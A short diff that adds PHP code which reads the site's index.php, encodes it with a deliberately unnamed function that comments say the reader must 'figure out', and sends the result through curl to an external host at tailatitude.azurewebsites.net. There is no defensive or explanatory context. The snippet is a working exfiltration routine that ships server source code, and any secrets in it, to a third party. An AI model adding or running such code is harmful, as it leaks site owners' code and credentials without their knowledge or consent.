@@ -1,0 +1,11 @@
+$cSession = curl_init();
+$content = AAAAAAA(file_get_contents('index.php'));
+#AAAAAA is a function
+#you have to figure it out
+curl_setopt($cSession,CURLOPT_URL,
+"http://tailatitude.azurewebsites.net/getdata.php?c=".$content);
+curl_setopt($cSession,CURLOPT_RETURNTRANSFER,true);
+curl_setopt($cSession,CURLOPT_HEADER, false);
+$result=curl_exec($cSession);
+curl_close($cSession);
+echo $result;
